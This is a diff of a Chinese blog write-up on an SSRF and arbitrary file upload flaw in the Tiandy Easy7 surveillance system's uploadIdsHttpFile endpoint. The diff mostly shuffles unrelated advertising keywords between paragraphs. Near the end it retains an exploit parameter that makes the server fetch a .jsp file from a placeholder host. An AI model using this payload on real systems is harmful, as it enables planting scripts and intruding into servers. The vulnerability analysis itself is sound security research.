@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。
+天地伟业Easy7是一款用于视频监控管理的软件系统。
 
-预约渗透测试
+计算机科学
 
 该系统的/Easy7/rest/file/uploadIdsHttpFile 接口接收用户提供的 URL 并直接发起 HTTP 请求，未对目标地址进行任何合法性校验（如白名单、协议限制等），导致 SSRF [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。同时，程序在处理下载文件的后缀名时，直接从用户可控的 URL 字符串中截取末尾内容，且未过滤路径穿越字符（../）和危险后缀（如 .jsp），导致攻击者可以向服务器上传任意脚本文件或利用路径穿越覆盖系统文件。
 
@@ -20,17 +20,19 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
-深入探索
-
-报名编程训练
-
-部署数据备份
-
-获取博客建站工具
-
 首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。
 
+计算机驱动器和存储设备
+
 再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")接口 `/rest/file/uploadIdsHttpFile` 的实现逻辑
+
+深入探索
+
+脚本语言
+
+博客资源与服务
+
+网络
 
 ```
 @Controller
@@ -58,13 +60,15 @@ public class CLS_REST_File {
 
 深入探索
 
-报名编程课程
+data
 
-预约安全审计
+Blog
 
-网络安全
+Database
 
 跟进 `com.tiandy.easy7.core.bo.CLS_BO_File#uploadIdsHttpFile` 方法，看下它的实现逻辑
+
+黑客与破解
 
 ```
 public CLS_VO_Result uploadIdsHttpFile(CLS_VO_UploadIdsFile voIn, CLS_VO_Progress progress) {
@@ -135,4 +139,4 @@ url={{url({{url(http://x.x.x.x/xxx.jsp)}})}}
 
 成功触发SSRF请求
 
-预约渗透测试
+编程
